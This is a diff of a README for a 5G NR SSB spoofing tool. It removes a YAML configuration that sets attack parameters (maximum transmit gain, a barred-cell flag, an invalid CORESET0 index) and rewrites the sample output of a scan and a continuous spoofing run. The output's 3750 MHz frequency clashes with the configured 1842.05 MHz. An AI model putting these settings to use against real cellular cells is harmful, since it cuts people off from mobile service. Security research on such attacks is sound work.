@@ -74,43 +74,6 @@ sudo ldconfig
 
 Add the `-DCMAKE_BUILD_TYPE=Debug` flag to build in developer/debug mode.
 
-## Configuration
-
-The SSB-Spoofer uses YAML configuration files to define attack parameters and RF settings.
-
-### Basic Configuration (`config.yaml`)
-
-```yaml
-# RF Configuration
-rf:
-  device_name: "uhd"
-  device_args: "type=b200"
-  rx_freq_hz: 1842050000    # Target 5G frequency
-  tx_freq_hz: 1842050000    # Same as RX for spoofing
-  srate_hz: 23040000        # 23.04 MHz sample rate
-  rx_gain_db: 40.0          # RX gain
-  tx_gain_db: 89.0          # Maximum TX gain
-
-# SSB Configuration  
-ssb:
-  pattern: "A"              # SSB pattern for FR1
-  scs_khz: 15               # 15 kHz subcarrier spacing
-  periodicity_ms: 20        # SSB periodicity
-  beta_pss: 1.0             # Maximum PSS power
-  beta_sss: 1.0             # Maximum SSS power
-  beta_pbch: 1.0            # Maximum PBCH power
-  beta_pbch_dmrs: 1.0       # Maximum PBCH DMRS power
-
-# Attack Configuration
-attack:
-  target_pci: 500           # Target Physical Cell ID
-  scan_for_target: true     # Auto-scan for target PCI
-  modify_cell_barred: true  # PRIMARY: Mark cell as barred
-  modify_coreset0_idx: true # SECONDARY: Corrupt CORESET0
-  coreset0_idx_value: 15    # Invalid CORESET0 index
-  continuous_tx: true       # Continuous transmission mode
-```
-
 ### Frequency Configuration
 
 To target a specific 5G cell, configure the center frequency based on your target band:
@@ -134,16 +97,41 @@ The tool will:
 ### Sample Output
 
 ```
-=== 5G NR SSB Spoofer ===
+========================================================
+              5G NR SSB Spoofer v1.0                    
+========================================================
+ WARNING: This tool is for research purposes only!      
+          Unauthorized use may be illegal.              
+========================================================
 
-=== Starting SSB Scan ===
-Target PCI: 500
+>> Loading configuration from: config.yaml
 
-✓ SSB Found!
-  PCI: 500
-  SSB Index: 0
-  SNR: 24.7 dB
-  RSRP: -21.2 dBm
+--------------------------------------------------------
+  Initializing RF Device
+--------------------------------------------------------
+
+--------------------------------------------------------
+  Initializing SSB Processor
+--------------------------------------------------------
+
+--------------------------------------------------------
+  Starting SSB Scan
+--------------------------------------------------------
+  Target PCI       : 500
+  Scan Duration    : 30 seconds
+  RX Buffer        : 23040 samples (1 ms)
+  Search Buffer    : 230400 samples (10 ms)
+--------------------------------------------------------
+
+>> Initializing receiver...
+   Ready. Starting capture...
+   Scanning... (2.3s)
+
+>> SSB Detected!
+   PCI              : 500
+   SSB Index        : 0
+   SNR              : 24.7 dB
+   RSRP             : -21.2 dBm
 
 === MIB Information ===
   SFN: 913
@@ -151,18 +139,43 @@ Target PCI: 500
   CORESET0 Index: 6
   SearchSpace Zero Index: 0
 
-=== Modifying MIB for SSB Spoofing Attack ===
-  [ATTACK] Cell Barred: false -> true (UE will reject this cell)
-  [ATTACK] CORESET0 Index: 6 -> 15 (invalid PDCCH config)
-  [ATTACK] SearchSpace0 Index: 0 -> 15 (invalid SIB1 search space)
+--------------------------------------------------------
+  Generating Spoofed SSB
+--------------------------------------------------------
+>> Modifying MIB parameters...
+  [ATTACK] Cell Barred: false -> true
+  [ATTACK] CORESET0 Index: 6 -> 15
+  [ATTACK] SearchSpace0 Index: 0 -> 15
+>> Encoding modified MIB...
+>> Signal generation complete
+   Generated        : 23040 samples
+   Amplitude        : 0.70
 
-=== Starting Continuous SSB Spoofing Attack ===
-Target: PCI 500
-Press Ctrl+C to stop...
+--------------------------------------------------------
+  Transmitting Spoofed SSB
+--------------------------------------------------------
+  Target PCI       : 500
+  Frequency        : 3750.00 MHz
+  TX Gain          : 89 dB
+--------------------------------------------------------
 
-[ATTACK] 1000 bursts transmitted (1s elapsed)
-[ATTACK] 2000 bursts transmitted (2s elapsed)
-...
+>> Starting Continuous Attack Mode
+   Target PCI       : 500
+   Press Ctrl+C to stop...
+
+   Transmitting... 15342 bursts (30s, 511.4 bursts/s)
+
+--------------------------------------------------------
+  Attack Statistics
+--------------------------------------------------------
+  Total Bursts     : 15342
+  Total Time       : 30 seconds
+  Average Rate     : 511.4 bursts/second
+--------------------------------------------------------
+
+========================================================
+  Attack Execution Complete
+========================================================
 ```
 
 ## Demonstration
